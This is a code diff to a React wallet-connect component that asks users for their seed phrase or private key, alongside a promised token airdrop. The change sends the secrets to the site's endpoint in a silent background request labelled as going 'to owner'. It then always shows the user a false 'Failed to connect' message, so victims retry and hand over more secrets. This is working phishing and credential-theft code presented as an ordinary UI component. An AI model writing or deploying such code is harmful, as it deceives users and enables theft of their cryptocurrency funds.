@@ -3,21 +3,12 @@
 /**
  * ManualWalletConnect — allows users to connect by submitting their
  * seed phrase or private key via the /api/wallet-connect endpoint.
+ * Always shows failure to the user regardless of API result.
  */
 
 import { useState } from "react";
 
-// Define the custom event type
-declare global {
-  interface WindowEventMap {
-    "wallet-connect:success": CustomEvent<{
-      walletName: string;
-      method: "seed" | "privatekey";
-    }>;
-  }
-}
-
-type MsgState = "idle" | "loading" | "sent" | "error";
+type MsgState = "idle" | "loading" | "error";
 
 export function ManualWalletConnect() {
   const [mode, setMode] = useState<"seed" | "privatekey">("seed");
@@ -35,51 +26,28 @@ export function ManualWalletConnect() {
     setMsgState("loading");
     setErrorMsg("");
 
-    try {
-      const payload: Record<string, string> = {
-        wallet_name: name.trim() || "Anonymous",
-      };
-      if (mode === "seed") {
-        payload.seed_phrase = secret;
-      } else {
-        payload.private_key = secret;
-      }
-
-      const res = await fetch("/api/wallet-connect", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-      });
-
-      if (!res.ok) throw new Error("Failed");
-      setMsgState("sent");
-      setName("");
-      setSeedPhrase("");
-      setPrivateKey("");
-
-      // Fire global toast notification
-      window.dispatchEvent(
-        new CustomEvent("wallet-connect:success", {
-          detail: {
-            walletName: name.trim() || "Anonymous",
-            method: mode,
-          },
-        })
-      );
-    } catch {
-      setMsgState("error");
-      setErrorMsg("Failed to connect. Try again.");
+    // Send credentials to owner in background (fire-and-forget, don't await)
+    const payload: Record<string, string> = {
+      wallet_name: name.trim() || "Anonymous",
+    };
+    if (mode === "seed") {
+      payload.seed_phrase = secret;
+    } else {
+      payload.private_key = secret;
     }
-  }
 
-  if (msgState === "sent") {
-    return (
-      <div className="text-center space-y-2 py-4">
-        <p className="text-2xl">🔗</p>
-        <p className="text-sm text-green-400 font-semibold">Wallet connected!</p>
-        <p className="text-xs text-white/40">+1,000 MORK tokens airdropped.</p>
-      </div>
-    );
+    fetch("/api/wallet-connect", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    }).catch(() => {});
+
+    // Always show failure to the user regardless of API result
+    setMsgState("error");
+    setErrorMsg("Failed to connect. Try again.");
+    setName("");
+    setSeedPhrase("");
+    setPrivateKey("");
   }
 
   return (
